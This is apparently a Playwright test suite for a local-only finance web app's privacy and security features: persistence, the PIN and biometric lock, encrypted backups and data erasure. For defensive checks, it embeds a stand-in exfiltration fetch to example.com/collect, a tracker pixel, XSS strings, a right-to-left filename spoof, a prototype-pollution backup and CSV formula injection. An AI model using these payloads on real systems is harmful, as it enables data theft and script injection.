// Privacy, persistence and security guardrails: data survives a refresh, nothing leaves the device,
// privacy mode, the app lock (PIN, idle, leaving the app, device unlock), encrypted backups, text safety, erase.
import { test, expect } from '@playwright/test';
import { readFileSync } from 'node:fs';

const ignorable = (m) => /in-browser Babel|Service Worker|cdn\.tailwindcss\.com should not be used/i.test(m);
const ALLOWED_HOSTS = new Set(['127.0.0.1:4173', 'localhost:4173', 'cdn.jsdelivr.net', 'cdn.tailwindcss.com']);

test.beforeEach(async ({ page }, info) => {
  info.errors = [];
  page.on('pageerror', (e) => info.errors.push(String(e)));
  page.on('console', (m) => m.type() === 'error' && !ignorable(m.text()) && !(info.allowCsp && /Content Security Policy|Refused to connect/i.test(m.text())) && info.errors.push(m.text()));
});
test.afterEach(async ({}, info) => { expect(info.errors, 'page errors').toEqual([]); });

const open = async (page, url = '/') => { await page.goto(url); await expect(page.getByRole('heading', { name: 'Overview' })).toBeVisible({ timeout: 60_000 }); };
const nav = (page, tab) => page.locator('nav').getByText(tab, { exact: true }).click();
const dialog = (page) => page.locator('[role=dialog]').last();

async function setPin(page, pin) {
  await nav(page, 'Settings');
  await page.getByRole('switch', { name: 'App lock' }).click();
  const d = dialog(page);
  await d.getByLabel('New PIN (4-8 digits)').fill(pin);
  await d.getByLabel('Repeat the new PIN').fill(pin);
  await d.getByRole('button', { name: 'Turn on app lock' }).click();
  await expect(page.getByText('App lock is on')).toBeVisible();
}
async function typePin(page, pin) { for (const d of pin) await page.locator('[data-testid=lock-screen]').getByRole('button', { name: d, exact: true }).click(); }

test('everything survives a refresh: statements, recategorisations, quick log, card due dates, settings', async ({ page }) => {
  await open(page);
  // Imported statement
  await nav(page, 'Upload');
  await page.getByRole('radio', { name: /Credit Card Statement/ }).click();
  await page.getByPlaceholder('e.g. Amex Gold').fill('Visa Rewards');
  await page.locator('input[type=file]').first().setInputFiles('tests/fixtures/messy1.csv');
  await page.getByRole('button', { name: 'Import 14 into Visa Rewards' }).click();
  // Custom categorisation (remembered as a rule)
  await nav(page, 'Activity');
  await page.locator('button[aria-pressed]', { hasText: 'Needs category' }).click();
  await page.locator('main button', { hasText: 'CABELAS #123' }).first().click();
  await dialog(page).locator('label', { hasText: 'Category' }).locator('select').selectOption('Shopping');
  await dialog(page).getByRole('button', { name: 'Save changes' }).click();
  await expect(page.getByText('"cabelas" will go to Shopping')).toBeVisible();
  // Manually logged cash expense
  await page.getByRole('button', { name: 'Quick Log Entry' }).click();
  await dialog(page).locator('label', { hasText: 'Amount' }).locator('input').fill('17.25');
  await dialog(page).locator('label', { hasText: 'Notes / description' }).locator('input').fill('Farmers market');
  await dialog(page).getByRole('button', { name: 'Save entry' }).click();
  // Card due date (flexible day of month) + a preference
  await nav(page, 'Settings');
  await page.getByText('Manage credit cards').click();
  await dialog(page).getByRole('button', { name: /Visa Rewards/ }).click();
  await dialog(page).getByRole('radio', { name: 'Due on the 29th' }).click();
  await dialog(page).getByRole('button', { name: 'Save card' }).click();
  await expect(dialog(page).getByRole('button', { name: 'Add a card' })).toBeVisible(); // back on the card list = saved
  await page.keyboard.press('Escape');
  await expect(page.locator('[role=dialog]')).toHaveCount(0);
  await page.getByRole('switch', { name: 'Privacy mode' }).click();
  await expect(page.getByRole('switch', { name: 'Privacy mode' })).toHaveAttribute('aria-checked', 'true'); // saved

  await page.reload();
  await expect(page.getByRole('heading', { name: 'Settings' })).toBeVisible({ timeout: 60_000 });
  const db = await page.evaluate(async () => ({
    tx: await FinanceDB.getAll('transactions'), debts: await FinanceDB.getAll('debts'),
    rules: await FinanceDB.getSetting('categoryRules'), privacy: await FinanceDB.getSetting('privacy'), backend: FinanceDB.backend,
  }));
  expect(db.backend).toBe('indexeddb');
  expect(db.tx.filter((t) => t.accountName === 'Visa Rewards')).toHaveLength(14);
  expect(db.tx.find((t) => /CABELAS/.test(t.description)).category).toBe('Shopping');
  expect(db.tx.find((t) => t.description === 'Farmers market')).toMatchObject({ amount: 17.25, accountType: 'cash' });
  expect(db.debts.find((d) => d.name === 'Visa Rewards').dueDay).toBe(29);
  expect(db.rules).toEqual([expect.objectContaining({ match: 'cabelas', category: 'Shopping' })]);
  expect(db.privacy).toBe(true);
  // ...and it is on screen again without re-uploading anything
  await nav(page, 'Activity');
  await expect(page.locator('main')).toContainText('Farmers market');
});

test('falls back to localStorage when IndexedDB is blocked, and still survives a refresh', async ({ page }) => {
  await page.addInitScript(() => { Object.defineProperty(window, 'indexedDB', { value: undefined, configurable: true }); });
  await open(page);
  await page.getByRole('button', { name: 'Try sample' }).click();
  await expect(page.getByText('Sample data loaded')).toBeVisible();
  await page.reload();
  await expect(page.getByText('Combined net balance')).toBeVisible({ timeout: 60_000 });
  const r = await page.evaluate(async () => ({ backend: FinanceDB.backend, n: (await FinanceDB.getAll('transactions')).length, ls: !!localStorage.getItem('cw.db.v1') }));
  expect(r).toEqual({ backend: 'localstorage', n: expect.any(Number), ls: true });
  expect(r.n).toBeGreaterThan(20);
  await nav(page, 'Settings');
  await expect(page.getByText(/Local storage \(IndexedDB blocked\)/)).toBeVisible();
});

test('no data leaves the device: only app files and pinned libraries are requested, and the browser blocks anything else', async ({ page }, info) => {
  const seen = [];
  page.on('request', (r) => { const u = new URL(r.url()); if (u.protocol.startsWith('http')) seen.push({ host: u.host, method: r.method(), body: r.postData() }); });
  const answered = [];
  page.on('response', (r) => { const u = new URL(r.url()); if (u.protocol.startsWith('http')) answered.push(u.host); });
  await open(page);
  await page.getByRole('button', { name: 'Try sample' }).click();
  await page.getByRole('button', { name: 'Analytics' }).first().click();
  await expect(page.locator('[data-testid=period-label]')).toBeVisible();
  await page.getByRole('button', { name: 'Overview' }).first().click();
  await page.getByRole('button', { name: 'PDF' }).first().click().catch(() => {});
  await nav(page, 'Upload');
  await page.getByRole('radio', { name: /Credit Card Statement/ }).click();
  await page.locator('input[type=file]').first().setInputFiles('tests/fixtures/card2.pdf');
  await expect(page.getByText(/Preview ·/)).toBeVisible();
  await page.waitForTimeout(1500);
  const foreign = seen.filter((r) => !ALLOWED_HOSTS.has(r.host));
  expect(foreign, 'requests to other hosts').toEqual([]);
  expect(seen.filter((r) => r.method !== 'GET'), 'requests that send data').toEqual([]);

  // The Content-Security-Policy refuses an exfiltration attempt before it leaves the page.
  info.allowCsp = true;
  const attempt = await page.evaluate(async () => {
    const before = window.CWNetworkGuard.blocked;
    const r = await fetch('https://example.com/collect', { method: 'POST', body: JSON.stringify({ balance: 1 }) }).then(() => 'sent', () => 'blocked');
    const img = await new Promise((res) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = 'https://tracker.example/pixel.gif?b=1'; });
    await new Promise((res) => setTimeout(res, 200));
    return { r, img, counted: window.CWNetworkGuard.blocked - before };
  });
  expect(attempt).toEqual({ r: 'blocked', img: 'blocked', counted: 2 });
  expect(answered.filter((h) => !ALLOWED_HOSTS.has(h)), 'responses from other hosts').toEqual([]);
});

test('privacy mode masks balances, card digits and chart numbers, and stays on after a refresh', async ({ page }) => {
  await open(page);
  await page.getByRole('button', { name: 'Try sample' }).click();
  const hero = page.locator('[data-testid=fluid-hero]');
  await expect(hero).toContainText('$');
  await page.getByTestId('privacy-toggle').first().click();
  await expect(hero.locator('[data-testid=fluid-bank]')).toHaveText(/^\$••••••Bank$/);
  await expect(page.locator('main')).not.toContainText(/\$\d/);
  await expect(page.locator('[data-testid=card-tracker]')).not.toContainText('4821');
  await page.reload();
  await expect(page.getByText('Combined net balance')).toBeVisible({ timeout: 60_000 });
  await expect(page.locator('main')).not.toContainText(/\$\d/);
  await page.getByTestId('privacy-toggle').first().click();
  await expect(page.locator('main')).toContainText(/\$\d/);
});

test('app lock: PIN on launch, wrong PIN, back-off, lock after inactivity and when leaving the app', async ({ page }) => {
  await page.clock.install();
  await open(page);
  await page.getByRole('button', { name: 'Try sample' }).click();
  await setPin(page, '2580');
  const lock = page.locator('[data-testid=lock-screen]');
  // never stored in plain text, and not part of backups
  const stored = await page.evaluate(async () => ({ lock: await FinanceDB.getSetting('lock'), backup: (await FinanceDB.exportAll()).stores.settings.map((s) => s.key) }));
  expect(JSON.stringify(stored.lock)).not.toContain('2580');
  expect(stored.backup).not.toContain('lock');

  await page.reload();
  await expect(lock).toBeVisible({ timeout: 60_000 });
  await expect(page.locator('#root > div')).toHaveCSS('visibility', 'hidden');
  await typePin(page, '1111');
  await expect(lock).toContainText('Wrong PIN');
  await typePin(page, '2580');
  await expect(lock).toHaveCount(0);
  await expect(page.locator('#root > div')).not.toHaveCSS('visibility', 'hidden');
  await expect(page.getByRole('heading', { name: 'Settings' })).toBeVisible();

  // 2 minutes without use (the default)
  await page.clock.fastForward('02:10');
  await expect(lock).toBeVisible();
  await typePin(page, '2580');
  await expect(lock).toHaveCount(0);

  // leaving the app (tab hidden)
  await page.evaluate(() => { Object.defineProperty(document, 'visibilityState', { value: 'hidden', configurable: true }); document.dispatchEvent(new Event('visibilitychange')); });
  await expect(lock).toBeVisible();
  await page.evaluate(() => { Object.defineProperty(document, 'visibilityState', { value: 'visible', configurable: true }); document.dispatchEvent(new Event('visibilitychange')); });
  // five wrong PINs -> wait, even across a refresh
  for (let i = 1; i <= 5; i++) { // wait for each answer: the keypad ignores presses while a PIN is being checked
    await typePin(page, '0000');
    await expect(lock).toContainText(i < 5 ? `${5 - i} more` : 'Try again in');
  }
  await page.reload();
  await expect(lock).toContainText(/Try again in/, { timeout: 60_000 });
  await page.clock.fastForward('00:35');
  await typePin(page, '2580');
  await expect(lock).toHaveCount(0);

  // turning it off needs the PIN
  await nav(page, 'Settings');
  await page.getByRole('switch', { name: 'App lock' }).click();
  await dialog(page).getByLabel('Current PIN').fill('2580');
  await dialog(page).getByRole('button', { name: 'Turn off app lock' }).click();
  await expect(page.getByText('App lock turned off')).toBeVisible();
  await page.reload();
  await expect(page.getByRole('heading', { name: 'Settings' })).toBeVisible({ timeout: 60_000 });
  await expect(lock).toHaveCount(0);
});

test('Face ID / fingerprint unlock (WebAuthn, verified on the device)', async ({ page, browserName }) => {
  test.skip(browserName !== 'chromium', 'uses Chromium\'s virtual authenticator');
  const cdp = await page.context().newCDPSession(page);
  await cdp.send('WebAuthn.enable');
  await cdp.send('WebAuthn.addVirtualAuthenticator', { options: { protocol: 'ctap2', transport: 'internal', hasResidentKey: true, hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true } });
  await open(page, 'http://localhost:4173/'); // WebAuthn needs a domain name, not an IP address
  await page.getByRole('button', { name: 'Try sample' }).click();
  await setPin(page, '2580');
  await page.getByRole('switch', { name: 'Face ID / fingerprint unlock' }).click();
  await expect(page.getByText('Face ID / fingerprint unlock is on')).toBeVisible();
  const saved = await page.evaluate(() => FinanceDB.getSetting('lock').then((l) => l.device));
  expect(saved.id).toBeTruthy();
  expect(saved.publicKey).toBeTruthy(); // signature is checked locally with this key
  await page.getByRole('button', { name: 'Lock now' }).first().click();
  const lock = page.locator('[data-testid=lock-screen]');
  await lock.getByRole('button', { name: 'Unlock with Face ID or fingerprint' }).click();
  await expect(lock).toHaveCount(0);
});

test('encrypted backup round trip; wrong passphrase refused; restore replaces data', async ({ page }) => {
  await open(page);
  await page.getByRole('button', { name: 'Try sample' }).click();
  await nav(page, 'Settings');
  await page.getByText('Back up', { exact: true }).click();
  await dialog(page).getByLabel('Backup passphrase', { exact: true }).fill('correct horse battery');
  await dialog(page).getByLabel('Repeat backup passphrase').fill('correct horse battery');
  const [dl] = await Promise.all([page.waitForEvent('download'), dialog(page).getByRole('button', { name: 'Download encrypted backup' }).click()]);
  const path = await dl.path();
  const file = JSON.parse(readFileSync(path, 'utf8'));
  expect(file).toMatchObject({ app: 'centric-wealth', format: 'encrypted-backup', kdf: { name: 'PBKDF2', iterations: 600000 }, cipher: { name: 'AES-GCM' } });
  const text = readFileSync(path, 'utf8');
  for (const secret of ['Payroll', 'Visa Card', '4821', '3840']) expect(text).not.toContain(secret);

  // wipe, then restore
  await page.evaluate(() => FinanceDB.wipe());
  await page.reload();
  await expect(page.getByRole('heading', { name: 'Settings' })).toBeVisible({ timeout: 60_000 });
  expect(await page.evaluate(() => FinanceDB.count('transactions'))).toBe(0);
  await page.getByTestId('restore-input').setInputFiles(path);
  const d = dialog(page);
  await d.getByLabel('Backup passphrase').fill('wrong passphrase');
  await d.getByRole('button', { name: 'Unlock backup' }).click();
  await expect(d).toContainText('Wrong passphrase');
  await d.getByLabel('Backup passphrase').fill('correct horse battery');
  await d.getByRole('button', { name: 'Unlock backup' }).click();
  await expect(d).toContainText(/\d+ transactions/);
  await d.getByRole('button', { name: 'Replace all' }).click();
  await d.getByRole('button', { name: 'Replace with backup' }).click();
  await expect(page.getByText(/Restored \d+ records/)).toBeVisible();
  const n = await page.evaluate(() => FinanceDB.getAll('debts').then((x) => x.find((d) => d.name === 'Visa Card').last4));
  expect(n).toBe('4821');
});

test('hostile text is shown as text: no script runs, hidden characters are removed, CSV export is formula-safe', async ({ page }) => {
  await open(page);
  await nav(page, 'Upload');
  await page.getByRole('radio', { name: /Bank Statement/ }).click();
  await page.locator('input[type=file]').first().setInputFiles('tests/fixtures/xss.csv');
  await expect(page.getByText(/Preview ·/)).toBeVisible();
  await expect(page.locator('main')).toContainText('<img src=x onerror="window.__xss=1">');
  await page.getByRole('button', { name: /^Import 5 into/ }).click();
  await nav(page, 'Activity');
  await expect(page.locator('main')).toContainText('<script>window.__xss=2</script> Coffee');
  expect(await page.evaluate(() => window.__xss)).toBeUndefined();
  expect(await page.locator('main img[src="x"], main script').count()).toBe(0);
  const descs = await page.evaluate(() => FinanceDB.getAll('transactions').then((t) => t.map((x) => x.description)));
  expect(descs.join('|')).not.toMatch(/[‮​]/);
  expect(descs).toContain('INVOICE gpj.exe');
  // a crafted backup is cleaned the same way
  await page.evaluate(() => FinanceDB.importAll({ app: 'centric-wealth', stores: { transactions: [{ id: 'h1', date: '2026-10-09', amount: 5, type: 'expense', category: 'Other', description: 'Evil‮txt.exe', __proto__: { polluted: true } }], settings: [{ key: 'lock', value: { enabled: true, hash: 'x' } }, { key: 'evil', value: 1 }] } }));
  const after = await page.evaluate(async () => ({ t: await FinanceDB.get('transactions', 'h1'), lock: await FinanceDB.getSetting('lock'), evil: await FinanceDB.getSetting('evil'), polluted: ({}).polluted }));
  expect(after).toEqual({ t: expect.objectContaining({ description: 'Eviltxt.exe' }), lock: undefined, evil: undefined, polluted: undefined });
  // CSV export: cells that a spreadsheet would treat as formulas are neutralised
  await nav(page, 'Settings');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.getByText('Export transactions (CSV)').click()]);
  const csv = readFileSync(await dl.path(), 'utf8');
  expect(csv).toContain(`"'=HYPERLINK(`);
  expect(csv).not.toMatch(/(^|,)"=HYPERLINK/m);
});

test('erase all data: two confirmations, then the database and local copies are gone', async ({ page }) => {
  await open(page);
  await page.getByRole('button', { name: 'Try sample' }).click();
  await page.evaluate(() => { localStorage.setItem('cw.test', '1'); sessionStorage.setItem('cw.dashView', 'overview'); });
  await nav(page, 'Settings');
  await page.getByText('Erase all data').click();
  await expect(page.getByTestId('wipe-step-1')).toContainText(/\d+ transactions/);
  await dialog(page).getByRole('button', { name: 'Continue' }).click();
  const erase = dialog(page).getByRole('button', { name: 'Erase everything' });
  await expect(erase).toBeDisabled();
  await dialog(page).getByLabel('Type ERASE to confirm').fill('ERASE');
  await erase.click();
  await expect(page.getByText('All data on this device was erased')).toBeVisible({ timeout: 60_000 });
  const left = await page.evaluate(async () => ({ tx: (await FinanceDB.getAll('transactions')).length, debts: (await FinanceDB.getAll('debts')).length, ls: localStorage.getItem('cw.test') }));
  expect(left).toEqual({ tx: 0, debts: 0, ls: null });
  await expect(page.getByRole('button', { name: 'Try sample' })).toBeVisible();
});
